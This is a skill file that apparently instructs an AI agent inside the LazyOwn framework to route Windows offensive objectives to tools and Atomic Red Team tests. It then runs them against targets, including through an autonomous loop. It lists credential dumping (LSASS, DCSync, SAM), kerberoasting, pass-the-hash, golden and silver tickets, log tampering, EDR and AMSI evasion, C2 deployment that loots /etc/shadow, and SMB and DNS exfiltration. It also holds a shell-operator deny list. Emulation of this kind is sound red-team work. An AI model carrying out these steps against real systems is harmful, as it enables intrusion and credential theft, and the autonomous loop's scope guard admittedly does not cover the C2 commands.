---
name: awesome-windows-security
description: "Route a Windows offensive objective to the right tool and run it inside LazyOwn. Uses chryzsh/awesome-windows-security as the ATT&CK technique catalogue, translates each technique into Atomic Red Team test IDs, generates the artefacts and executes them against in-scope targets through apt_chain, the atomic bridge and the autonomous loop."
trigger: /awesome-windows-security
---

# /awesome-windows-security

Upstream catalogue: <https://github.com/chryzsh/awesome-windows-security> — an
ATT&CK-organised list of offensive Windows tooling (ruler, SharpWMI,
PowerUp, Rubeus, BloodHound, Seatbelt, Empire, LOLBAS, ...).

That list is a reading list. This skill is the **router**: objective →
technique → Atomic Red Team test IDs → generated artefacts → execution
against an in-scope target → evidence.

## Step 0 — Contract (non-negotiable)

1. **Authorized engagements only.** Every tool below is offensive tooling.
   Confirm the target is in scope before running anything.
2. **Scope first, always.** `scope add <target>` and `scope mode enforce`
   before the first artefact runs. The scope guard covers categories 01-09,
   14 and 15 — the atomic and C2 commands live in "10. Command & Control"
   and are **not** blocked by it, so the guard is not your safety net here.
3. **Evidence over assumption.** A command with no output produced no
   finding. Never report a technique as "worked" without the artefact
   (`sessions/*.json`, `sessions/temp_uploads/*.ps1`, a hash file, a PCAP).
4. **Phase discipline.** Discovery before credential access before lateral
   movement. Do not jump to T1003/T1550 on a host you have not enumerated.
5. **Read the operator's rules** (`soul.md`) before destructive or
   persistence steps. Log tampering and persistence are engagement-ending
   actions: only with an explicit instruction.
6. **No fabricated output.** If a tool or test is missing, report the gap.

## Step 1 — Classify the objective

Map the request onto the upstream taxonomy, then **normalise the ATT&CK ID**.
The upstream list predates the ATT&CK renames; several of its IDs were
replaced and no longer resolve to an Atomic test.

| Upstream technique | Current ATT&CK ID | Note |
|---|---|---|
| T1203 (ruler) | — | exploit delivery, not emulation — no Atomic test, use the exploit route |
| T1047 (SharpWMI) | T1047 | keep |
| T1546 (WheresMyImplant) | T1546.003 / T1547.001 / T1053.005 | split by persistence mechanism |
| T1068 (alpc-diaghub) | T1068 | exploit privesc, Atomic has BYOVD samples only |
| T1134 (juicy-potato, Tokenvator) | T1134.001 / T1134.002 / T1134.005 | token duplication / access token manipulation |
| T1089 (disable security tools) | T1562.001 | renamed; no Windows Atomic test — use the addon route |
| T1027 (mimikatz_obfuscator) | T1027 / T1027.004 | keep / compile-after-delivery |
| T1055 (SharpCradle) | T1055 / T1055.001 | keep / DLL injection |
| T1208 (Rubeus) | T1558.003 | renamed to "Kerberoasting" |
| T1081 (creds in files) | T1552.001 / T1552.006 / T1555.003 | renamed |
| T1214 (creds in registry) | T1552.002 / T1552.004 | renamed |
| T1110 (DomainPasswordSpray) | T1110.001 / T1110.003 / T1110.004 | guessing / spraying / stuffing |
| T1003 (mimikatz, Powerdump) | T1003.001-.006 | LSASS / SAM / NTDS / LSA / cache / DCSync |
| T1171 (Responder) | T1557.001 | renamed to LLMNR/NBT-NS poisoning |
| T1082 (Windows-Exploit-Suggester) | T1082 / T1518 / T1016 | system, software, network config |
| T1135 (SmbScanner) | T1135 / T1021.002 | shares / admin shares |
| T1005 (mimikittenz) | T1005 / T1113 / T1115 | local data / screen / clipboard |
| T1048 (SharpBox) | T1048 / T1570 | keep / exfil over SMB |
| T1102 (C2 over web service) | — | no Atomic test — use the native C2 surface |
| T1070 (Invoke-Phant0m) | T1070.003 / T1070.006 | PS history / timestamps (T1070.001 has no Windows test) |

Full catalogue on demand:

```bash
curl -fsSL https://raw.githubusercontent.com/chryzsh/awesome-windows-security/master/README.md
```

## Step 2 — Pick the route

| Route | When | How |
|---|---|---|
| **Route A — native** | LazyOwn already ships the capability | run the command from the router table (Step 3) |
| **Route B — addon** | upstream tool is not in LazyOwn yet | `/lazyaddon-creator <repo-url>` (Step 11) |
| **Route C — atomic** | the technique has an Atomic Red Team test | translate → generate → execute (Steps 4-6) |
| **Route D — chain** | the objective is a full adversary emulation | `apt_chain` (Step 7) or the autonomous loop (Step 8) |

Routes C and D share the same substrate: the Atomic Red Team checkout in
`external/.exploit/atomic-red-team` plus the offline index in
`parquets/techniques.parquet`.

## Step 3 — Router table (native LazyOwn commands)

### Initial Access / Execution

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1203 | ruler (Exchange rules) | B | — | needs Exchange creds; `phish_wizard` is the LazyOwn phishing path |
| T1047 | SharpWMI | A | `wmiexecpro`, `wmi_lateral --command <cmd>` | `wmi_lateral` also takes `--hash` (pass-the-hash) |
| T1059 | PowerShell | A | `msf`, `dotnet_payload`, `sharpshooter -o <file> --oa -t 20` | `sharpshooter` emits HTA/JS/VBS/WSF |
| — | WheresMyImplant | A/C | `wmi_persist`, `wmi_scheduled_task`, atomic T1546.003 | fileless event subscription vs scheduled task |

### Privilege Escalation

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1068 (misconfig) | PowerUp / SharpUp | A | `privesc_cmd_by_os` (winpeas), `privesc_suggest`, `crystal_ball` | `crystal_ball` ranks winpeas output into exact commands |
| T1068 (exploit) | alpc-diaghub | B | — | Server 2016 / Win10 only, ALPC Diagnostics Hub |
| T1134 | juicy-potato | A | `juicypotato` | serves the binary over HTTP and prints the target one-liner |
| T1134 | Tokenvator | B/C | atomic T1134.001 / T1134.002 | token manipulation; `certipy_ad shadow` is the ADCS-adjacent alternative |
| T1068 | Watson / Windows-Exploit-Suggester | A | `exploit_recommend`, `privesc_suggest` | match discovered services and patch level to CVEs |

### Defense Evasion

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1027 | mimikatz_obfuscator | A | `ofuscate_payload`, `mutate_shellcode`, `createpayload` | base64/encoding + polymorphic mutation |
| T1562.001 | AMSI bypass articles | B + A | `evasive`, `msf` (stagerless), `sharpshooter` | articles are dated; prefer detection-aware generators |
| T1070.001 | Invoke-Phant0m | A/C | `log_tamper windows`, `wipe_logs`, atomic T1070.003 | 13 event logs + EventLog suspend + Sysmon; engagement-ending |
| T1089 | AV config enumeration (fortynorth) | A | `edr_detector` (addon) | fingerprints 17 products, local or remote WMI/SMB/WinRM |
| T1055 | SharpCradle | A/C | `msf` (meterpreter), `c2_beacon_cmd`, atomic T1055.001 | in-memory .NET load |

### Credential Access

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1558.003 | Rubeus | A/C | `rubeus` (one-liner to clipboard), `kerberoast --mode aes --high-value`, atomic T1558.003 | `--mode aes` avoids RC4-HMAC EDR rules |
| T1558 | Kerberos ticket abuse | A | `kerberos_ticket silver\|golden\|diamond\|sapphire`, `ticketer` | diamond = golden + enhanced PAC admin SIDs |
| T1003.001 | mimikatz | B | — | `mimikatzpy` exists but its backing module is absent in this checkout; wrap the real mimikatz with `/lazyaddon-creator` |
| T1003.002 | Powerdump.ps1 | A/C | `samdump2`, `crack_hashes`, `hashcat`, atomic T1003.002 | hashes land in `sessions/`, cracked creds import to the DB |
| T1003 | Internal-Monologue | A | `getnthash_py` | NT hash via Kerberos U2U, no LSASS touch |
| T1003 | lazykatz / poshkatz | A | `passwordspray` | `spraykatz` covers the same ground but its backing module is absent in this checkout |
| T1081 | SharpCloud | A | `cloud_enum` (addon) | creds in AWS/Azure/GCP files on the target |
| T1081 | KeeThief / credgrap_ie_edge | B/C | atomic T1552.001, T1555.003 | browser and KeePass material |
| T1214 | windows_sshagent_extract | B/C | atomic T1552.004 | private keys from the Win10 ssh-agent service |
| T1110 | DomainPasswordSpray | A/C | `passwordspray`, `adsso_spray` (Azure AD SSO), atomic T1110.003 | `cred_reuse` picks the spray targets first |
| T1110 | SprayingToolkit / MailSniper | B | — | Lync/OWA spraying, Exchange mail search |
| T1171 | Responder | A/C | `responder`, atomic T1557.001 | apt-installs, `sudo responder -I {device} -w On` |
| T1171 | Inveigh / InveighZero | B/C | atomic T1557.001 | `responder` covers the LLMNR/NBNS/MDNS case |

### Discovery

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1087.002 | PowerView (dev) / SharpView | A/C | `ad_ldap_enum`, `ldapsearch`, `ldapdomaindump`, atomic T1087.002 | `-Credential` style auth is why the dev branch is recommended |
| T1087.002 | BloodHound / SharpHound | A | `bloodhound` (bloodhound-python) | needs `sessions/credentials.txt` in `user:password` form |
| T1135 | SmbScanner | A/C | `smbattack`, `smbmap -H {rhost}`, `smbclient`, atomic T1135 | SMBv1/v2 dialect checks |
| T1082 | Windows-Exploit-Suggester / Watson | A/C | `exploit_recommend`, `privesc_suggest`, atomic T1082 | patch-level gap to CVE mapping |
| T1082 | Seatbelt (host survey) | A + B | `privesc_cmd_by_os` (winpeas), atomic T1082 | Seatbelt itself is Route B |

### Lateral Movement

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1550.002 | mimikatz pass-the-hash | A/C | `psexec pass`, `wmiexecpro`, `dcomexec hash`, `evilwinrm hash`, atomic T1550.002 | `dcomexec` takes `pass` or `hash` |
| T1021.002 | CrackMapExec | A/C | `smbattack`, `passwordspray`, `smbmap`, atomic T1021.002 | `lateral_mov_lin` for the Linux leg |
| T1550.003 | Pass-the-ticket | A/C | `kerberos_ticket`, `gets4uticket_py`, `gettgtpkinit_py`, atomic T1550.003 | PKINIT path: certificate → TGT |
| — | Pivoting guide | A | `autopivot`, `socks_config`, `pivot`, `apt_proxy` | `autopivot` detects internal ranges and builds tunnels |
| T1021.006 | WinRM | A/C | `evilwinrm pass\|hash\|nopass`, atomic T1021.006 | `nopass` = Kerberos-only to `<sub>.<domain>` |
| T1558.002 | ADCS abuse | A | `certipy_ad find\|shadow\|vuln\|account\|auth`, `adcs_esc`, `adcs_check` | `adcs_esc` covers ESC1-ESC13 |

### Command and Control

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1102 | Empire | A | LazyOwn native C2: `beaconcfg`, `c2_beacons`, `c2_beacon_cmd` | prefer the framework C2 over a second one |
| T1102 | SILENTTRINITY | B | — | Route B; the C2 surface is `beaconcfg` + `c2_beacon_cmd` |
| T1102 | Cobalt Strike | A | `blacksandbeacon` (addon), `beaconcfg`, `bof_catalog` | CS-compatible beacon profile + BOF catalogue |
| T1102 | Cobalt Strike over external C2 via Dropbox | A | `dns_beacon`, `beaconcfg` (domain fronting) | no Atomic test — use the native C2 surface |
| — | SharpSploit / SharpAttack | B | `sharpshooter`, `msf` | Route B for the full .NET surface |

### Collection / Exfiltration

| Technique | Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|---|
| T1005 | mimikittenz | B/C | atomic T1005, T1113, T1115 | memory scrape; the `scavenger` command exists but its backing module is absent here |
| T1005 | SlackExtract | B | — | workspace scrape |
| T1048 | SharpBox | A/C | `smb_exfil <file> --host <smb_host>`, `dns_beacon`, atomic T1048 | needs `impacket-smbserver` on the attacker side (`smbserver`) |

### Defense and assurance

| Upstream tool | Route | LazyOwn command | Note |
|---|---|---|---|
| awesome-windows-domain-hardening | reference | — | hardening checklist to review against findings |
| UncoverDCShadow | B | — | DCShadow detection; no native equivalent |
| Seatbelt | B | `privesc_cmd_by_os` | C# host survey — winpeas covers the offensive half |
| PingCastle | B | — | AD risk scoring |
| WindowsDefenderATP-Hunting-Queries | B | — | M365 Defender hunting queries |
| atomic-red-team | C/D | `atomic_gen`, `atomic_tests`, `atomic_emulate`, `atomic_agent`, `atomic_clean` | the whole Atomic surface |
| LOLBAS | A | `lolbas_list`, `lolbas_use`, `gtfo <binary>`, `evasive lolbas <url>` | `gtfo` queries the LOLBas parquet knowledge base |
| PowerSploit / SharpSploit / SharpAttack | B | `sharpshooter`, `msf` | Route B for the full .NET surface |
| DeathStar | B/D | `bloodyAD`, `kerberos_ticket diamond`, `privesc_cmd_by_os` | assemble the path manually instead of Empire |
| PowerShellArsenal / SharpCompile / SharpGen | B | `dotnet_payload` | Route B for the dev tooling |

## Step 4 — Translate the technique into Atomic test IDs

The Atomic Red Team checkout may be missing; the resolver syncs it on
demand (`ensure_repo`). The offline index in `parquets/techniques.parquet`
(1690 tests) always works.

**Authoritative (resolver, platform-filtered):**

```bash
python3 - <<'PY'
from modules.atomic_resolver import AtomicResolver
r = AtomicResolver(); r.build_index()
for t in r.list_for_technique("T1003.006", platform="windows"):
    print(t.guid, "|", t.name)
PY
```

**Offline (parquet index):**

```bash
python3 - <<'PY'
import pandas as pd
df = pd.read_parquet('parquets/techniques.parquet')
hits = df[df['mitre_id'] == 'T1003.006']
for _, r in hits.iterrows():
    print(r['id'], "|", r['name'], "|", list(r['platforms']))
PY
```

**Curated translation table** (Windows platform, real GUIDs from the
resolver — regenerate it whenever the atomic-red-team checkout changes):

| Technique | Atomic test GUID | Test name |
|---|---|---|
| T1047 | c107778c-dcf5-47c5-af2e-1d058a3df3ea | WMI Reconnaissance Users |
| T1047 | 5750aa16-0e59-4410-8b9a-8a47ca2788e2 | WMI Reconnaissance Processes |
| T1546.003 | 3c64f177-28e2-49eb-a799-d767b24dd1e0 | Persistence via WMI Event Subscription - CommandLineEventConsumer |
| T1547.001 | e55be3fd-3521-4610-9d1a-e210e42dcf05 | Reg Key Run |
| T1053.005 | fec27f65-db86-4c2d-b66c-61945aee87c2 | Scheduled Task Startup Script |
| T1134.001 | 34f0a430-9d04-4d98-bcb5-1989f14719f0 | `SeDebugPrivilege` token duplication |
| T1134.002 | dbf4f5a9-b8e0-46a3-9841-9ad71247239e | Access Token Manipulation |
| T1027 | a50d5a97-2531-499e-a1de-5544c74432c6 | Execute base64-encoded PowerShell |
| T1027.004 | 453614d8-3ba6-4147-acc0-7ec4b3e1faef | Dynamic C# Compile |
| T1055 | 3203ad24-168e-4bec-be36-f79b13ef8a83 | Remote Process Injection in LSASS via mimikatz |
| T1055.001 | 74496461-11a1-4982-b439-4d87a550d254 | Process Injection via mavinject.exe |
| T1558.003 | 14625569-6def-4497-99ac-8e7817105b55 | Rubeus kerberoast |
| T1558.003 | e6f4affd-d826-4871-9a62-6c9004b8fe06 | Extract all accounts in use as SPN using setspn |
| T1558.004 | 615bd568-2859-41b5-9aed-61f6a88e48dd | Rubeus asreproast |
| T1558.001 | 9726592a-dabc-4d4d-81cd-44070008b3af | Crafting Active Directory golden tickets with mimikatz |
| T1558.002 | 385e59aa-113e-4711-84d9-f637aef01f2c | Crafting Active Directory silver tickets with mimikatz |
| T1552.001 | 0e56bf29-ff49-4ea5-9af4-3b81283fd513 | Extracting passwords with findstr |
| T1552.001 | 367d4004-5fc0-446d-823f-960c74ae52c3 | Access unattend.xml |
| T1552.002 | b6ec082c-7384-46b3-a111-9a9b8b14e5e7 | Enumeration for Credentials in Registry |
| T1552.004 | 520ce462-7ca7-441e-b5a5-f8347f632696 | Private Keys |
| T1552.006 | e9584f82-322c-474a-b831-940fd8b4455c | GPP Passwords (Get-GPPPassword) |
| T1555 | c89becbe-1758-4e7d-a0f4-97d2188a23e3 | Dump credentials from Windows Credential Manager With PowerShell |
| T1555.003 | 8c05b133-d438-47ca-a630-19cc464c4622 | Run Chrome-password Collector |
| T1110.001 | 09480053-2f98-4854-be6e-71ae5f672224 | Brute Force Credentials of single Active Directory domain users via SMB |
| T1110.003 | 263ae743-515f-4786-ac7d-41ef3a0d4b2b | Password Spray (DomainPasswordSpray) |
| T1110.004 | 4852c630-87a9-409b-bb5e-5dc12c9ebcde | Brute Force: Credential Stuffing using Kerbrute Tool |
| T1003.001 | 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8 | Dump LSASS.exe Memory using ProcDump |
| T1003.002 | 5c2571d0-1572-416d-9676-812e64ca9f44 | Registry dump of SAM, creds, and secrets |
| T1003.003 | c6237146-9ea6-4711-85c9-c56d263a6b03 | Copy NTDS.dit from Volume Shadow Copy |
| T1003.004 | 55295ab0-a703-433b-9ca4-ae13807de12f | Dumping LSA Secrets |
| T1003.005 | 56506854-89d6-46a3-9804-b7fde90791f9 | Cached Credential Dump via Cmdkey |
| T1003.006 | 129efd28-8497-4c87-a1b0-73b9a870ca3e | DCSync (Active Directory) |
| T1003.006 | a0bced08-3fc5-4d8b-93b7-e8344739376e | Run DSInternals Get-ADReplAccount |
| T1557.001 | deecd55f-afe0-4a62-9fba-4d1ba2deb321 | LLMNR Poisoning with Inveigh (PowerShell) |
| T1082 | 66703791-c902-4560-8770-42b8a91f7667 | System Information Discovery |
| T1518 | c49978f6-bd6e-4221-ad2c-9e3e30cc1e3b | Applications Installed |
| T1016 | 970ab6a1-0157-4f3f-9a73-ec4166754b23 | System Network Configuration Discovery on Windows |
| T1135 | 20f1097d-81c1-405c-8380-32174d493bbb | Network Share Discovery command prompt |
| T1021.002 | 0eb03d41-79e4-4393-8e57-6344856be1cf | Copy and Execute File with PsExec |
| T1087.002 | 6fbc9e68-5ad7-444a-bd11-8bf3136c477e | Enumerate all accounts (Domain) |
| T1018 | 85321a9c-897f-4a60-9f20-29788e50bccd | Remote System Discovery - net |
| T1069.002 | 0afb5163-8181-432e-9405-4322710c0c37 | Elevated group enumeration using net group (Domain) |
| T1482 | c58fbc62-8a62-489e-8f2d-3565d7d96f30 | Powershell enumerate domains and forests |
| T1005 | d3d9af44-b8ad-4375-8b0a-4bff4b7e419c | Search files of interest and save them to a single zip file (Windows) |
| T1113 | 3c898f62-626c-47d5-aad2-6de873d69153 | Windows Screencapture |
| T1115 | 9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52 | Collect Clipboard Data via VBA |
| T1048 | c943d285-ada3-45ca-b3aa-7cd6500c6a48 | DNSExfiltration (doh) |
| T1570 | d8d13303-159e-4f33-89f4-9f07812d016f | Exfiltration Over SMB over QUIC (New-SmbMapping) |
| T1550.002 | ec23cef9-27d9-46e4-a68d-6f75f7b86908 | Mimikatz Pass the Hash |
| T1550.003 | a2fc4ec5-12c6-4fb4-b661-961f23f359cb | Rubeus Kerberos Pass The Ticket |
| T1021.006 | efe86d95-44c4-4509-ae42-7bfd9d1f5b3d | WinRM Access with Evil-WinRM |
| T1021.001 | 355d4632-8cb9-449d-91ce-b566d0253d3e | RDP to Remote Host |
| T1070.003 | 2f898b81-3e97-4abb-bc3f-a95138988370 | Prevent Powershell History Logging |
| T1070.006 | b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c | Windows - Modify file creation timestamp with PowerShell |

## Step 5 — Generate the artefacts

**One test** (test + cleanup scripts, mode 0600, in
`sessions/temp_uploads/`):

```bash
atomic_gen T1003.006 --platform windows
atomic_gen 129efd28-8497-4c87-a1b0-73b9a870ca3e --platform windows
```

**A whole plan** — write the plan, then generate every step and the ordered
agent in one shot:

```yaml
# playbooks/attack_plan_aws_credaccess.yaml
platform: windows
platforms: [windows]
steps:
  - atomic_id: T1087.002
  - atomic_id: T1003.006
  - atomic_id: T1558.003
  - atomic_id: T1550.002
```

```bash
attack_plan playbooks/attack_plan_aws_credaccess.yaml --platform windows
```

This generates every `atomic_test_*.ps1` plus `atomic_clean_test_*.ps1`,
then builds the ordered Windows agent at
`/tmp/lazyown_atomic_test/apt_agent.ps1` (each test launched with
`Start-Process powershell.exe -Verb RunAs`) and the matching cleanup
agent. **The Windows agent path needs `backdoor_win_service_path`:**
`assign backdoor_win_service_path C:\ProgramData` before the run.

> `assign` accepts backslashes (Windows paths), but still rejects the
> shell operators `;`, `|`, `&`, `$()`, backticks, braces, `>`/`<`, `*`,
> `?`, `~`, `#` and quotes fail-closed, so injection payloads never persist.

> **Stale staging cannot flip the agent.** The extension and the script
> list are picked from the tests generated during THIS run (a declared
> plan platform decides the flavour outright). Leftover `.sh` files in
> `sessions/temp_uploads/` are ignored — `atomic_clean` remains good
> hygiene before a new engagement, but is no longer required for a
> correct Windows agent.

**From a public APT report** (playbook → attack plan):

```bash
apt_playbook list
apt_playbook info apt29
apt_playbook validate apt29      # checks Atomic test availability
apt_playbook run apt29           # writes playbooks/attack_plan_apt29.yaml
```

`--platform` is mandatory for correct emulation: without it the first
indexed test wins regardless of OS (Windows scripts against a Linux target).

## Step 6 — Execute against in-scope targets

```bash
scope add 10.10.11.5
scope mode enforce
assign rhost 10.10.11.5
assign domain corp.local
```

| Command | What it does |
|---|---|
| `atomic_tests T1003.006 --platform windows` | stage one test (clipboard / files) for manual execution on the target |
| `atomic_emulate --target 10.10.11.5 --techniques T1003.006,T1558.003 --platform windows` | run each technique's first platform-compatible test through a working shell; stages `sessions/atomic_emulate_<target>_<ts>.json` |
| `atomic_emulate --target 10.10.11.5 --playbook rocke --platform windows --dry-run` | resolve the plan without executing |
| `atomic_shell 10.10.11.5` | verify (or attach to) the multiplexed shell |
| `atomic_agent` | regenerate and sync the agent scripts |
| `atomic_clean 10.10.11.5` | soft cleanup: remove agent, drop files and test outputs; loot, reports and logs are evidence and are kept |
| `atomic_clean --hard 10.10.11.5` | soft cleanup plus destroy the lab container |

`atomic_emulate` opens its shell through an **exec-capable exploit spec in
`exploits/`** — today those are Linux labs. For a Windows target either add
a spec (psexec / wmiexec / evil-winrm) or use the manual route:
`atomic_tests` + the generated `.ps1` agent.

## Step 7 — Orchestrate with `apt_chain`

`apt_chain` runs a YAML-administered chain: recon → exploit sweep → C2 →
playbook → plan → emulation → shell, with checkpoints and replanning.

```bash
apt_chain list                       # every chain (valid, enabled)
apt_chain show apt_chain             # steps, defaults, extends
apt_chain validate apt_chain         # schema errors, step preview
apt_chain apt_chain 10.10.11.5 --dry-run
apt_chain apt_chain 10.10.11.5 --json
apt_chain apt_rocke 10.10.11.5       # per-APT chain
apt_chain checkpoints                # resumable runs
apt_chain resume <run_id> 10.10.11.5
```

Base chain steps (`chains/apt_chain.yaml`):

| Step | Command |
|---|---|
| 1 | `assign target {target}` |
| 2 | `lazynmap {target}` (skipped when `sessions/scan_<target>.nmap.xml` exists) |
| 3 | `atomic_exploit` (YAML exploit sweep from scan triggers) |
| 4-6 | `c2_server start`, `c2_deploy {target}`, `c2_loot {target} /etc/shadow` |
| 7-8 | `apt_playbook validate {playbook}`, `apt_playbook run {playbook}` |
| 9 | `attack_plan {plan_file}` (newest `playbooks/attack_plan_*.yaml`) |
| 10 | `atomic_emulate --target {target} --playbook {playbook}` |
| 11 | `create_session_json` |
| 12 | `atomic_shell --interactive {target}` |

Run options: `--dry-run`, `--json`, `--var key=value`, `--target`, `--playbook`,
`--timeout`, `--continue`, `--step a,b`, `--from-step id`, `--to-step id`,
`--replan`, `--no-checkpoint`. Unknown flags fail loudly.

**Custom chain for a technique set** — the artefact that ties an objective
to the Atomic IDs:

```yaml
# chains/chain_aws_credaccess.yaml
name: chain_aws_credaccess
description: AWS credential access emulation chain (windows).
enabled: true
extends: apt_chain
defaults:
  playbook: aws
steps:
  - id: enum
    run: atomic_emulate --target {target} --techniques T1087.002,T1018 --platform windows
  - id: dump
    run: atomic_emulate --target {target} --techniques T1003.006 --platform windows
  - id: tickets
    run: atomic_emulate --target {target} --techniques T1558.003 --platform windows
```

Validate before running: `apt_chain validate chain_aws_credaccess`.

## Step 8 — Autonomously

The single orchestrator (`auto_loop` == `lazy_loop`) runs the whole
objective — scope, asset, enrich, planner, frontier, worker, guard,
traffic, finding, retest — and the Atomic resolver is part of its tool
surface.

```bash
auto_loop --target 10.10.11.5 --task "emulate AWS credential access" \
          --rounds 6 --workers 2 \
          --budget rounds=6,toolcalls=40,findings=5,timeout_sec=900 \
          "emulate T1003.006 and T1558.003 on 10.10.11.5 (windows)"
```

| Flag | Meaning |
|---|---|
| `--target T` | engagement target (defaults to `rhost`) |
| `--task T` | task id for the objective |
| `--rounds N` / `--workers N` | engine depth and parallelism |
| `--timeout S` / `--step-delay S` | wall clock and pacing |
| `--budget rounds=N,toolcalls=N,findings=N,timeout_sec=N` | hard caps at the engine level |
| `--budget-confirm` | gate the start behind an interactive confirmation unless `LAZYOWN_AUTONOMOUS=1` |
| `--no-bootstrap` | skip the bootstrap phase |
| `--view` / `--plain` | live worker monitor or milestone panel |

`auto_pwn` is the exploit-side sibling:
`auto_pwn --pivot --privesc --stealth low|medium|high|paranoid`.

Rules for autonomous runs:

1. Put the technique IDs, the platform, the target and the stop condition
   in the goal string — the loop is only as good as the objective.
2. Always set a budget. An unbounded loop against a real host is not an
   engagement, it is an incident.
3. Set `scope mode enforce` before starting and keep the scope list tight.
4. `LAZYOWN_AUTONOMOUS=1` skips the interactive confirmation; use it only
   in labs.

## Step 9 — Preconditions

1. **Scope the target.** `scope add <ip>`, `scope mode enforce`,
   `assign rhost <ip>`; AD work also needs `assign domain <domain>` and
   `assign username` / `assign password`.
2. **Credentials file.** Most AD commands read `sessions/credentials.txt`
   with one `user:password` per line; NT hashes in `sessions/hash.txt`.
3. **Windows agent path.** `assign backdoor_win_service_path C:\ProgramData`
   before `attack_plan --platform windows`.
4. **Platform flag.** Always pass `--platform windows` to `atomic_gen`,
   `atomic_tests`, `atomic_emulate` and `attack_plan` — the default is
   `linux` and the wrong filter runs Windows scripts on a Linux target.
5. **Know where the command runs.** Operator host (`ldapsearch`,
   `bloodhound`, `smbmap`, `responder`, `kerberoast`), remote execution
   through the target (`wmiexec`, `psexec`, `dcomexec`, `evilwinrm`), or
   on-target delivery (`juicypotato`, `rubeus`, the atomic agent).
6. **Elevation.** `responder` and the atomic Windows agent need admin on
   the target; `sudo_available` gates unattended runs on the operator host.

## Step 10 — Record the evidence

1. Every atomic run stages its own artefact: `sessions/atomic_emulate_<target>_<ts>.json`,
   the generated scripts in `sessions/temp_uploads/`, and the YARA hits.
2. Convert output into a finding:
   `lazy_finding report "<name>" :: "<summary>"` (or `share_finding <text>`
   to broadcast to the team).
3. Store credentials in the DB (`db_creds`) — never in a note.
4. Clean the target when the engagement phase ends: `atomic_clean <target>`
   (loot, reports and logs are always kept).
5. Mark the phase in the world model before moving to the next tactic.

## Step 11 — No coverage: build the addon (Route B)

When the upstream tool is not in LazyOwn, wrap it with `/lazyaddon-creator`:

```bash
/lazyaddon-creator https://github.com/<owner>/<repo>
```

Archetype by tool type:

| Tool type | Archetype | Notes |
|---|---|---|
| .NET / C# console (SharpHound, SharpView, Seatbelt) | A | `dotnet build -c Release`; publish a self-contained single file |
| PowerShell module (PowerUp, PowerSploit) | A | `pwsh -File <script>`; `-ExecutionPolicy Bypass` only when the operator allows it |
| Go (InveighZero) | A | `go build .` |
| Python (BloodHound-python, MailSniper) | A | `pip install -r requirements.txt` |
| Post-exploitation agent (SILENTTRINITY, Empire) | C/D | stage to `sessions/`, deliver with `lazycommand` |
| Rule set only | C | `/marketplace-contributor` for YARA/Nuclei content |

After the addon registers, verify with `help <name>` and record the technique
in the finding.

## Reference

- Upstream catalogue:
  <https://github.com/chryzsh/awesome-windows-security>
- Related skills: `/lazyaddon-creator` (Route B), `/marketplace-contributor`
  (rules and templates), `/apt-emulation` (full adversary emulation),
  `/atomic-exploit` (YAML-administered exploits).
- Local contracts: `modules/atomic_resolver.py` (MITRE <-> Atomic
  translator), `modules/chain_registry.py` (chain schema),
  `modules/atomic_exploit_bridge.py` (exec-capable specs),
  `parquets/techniques.parquet` (offline Atomic index).
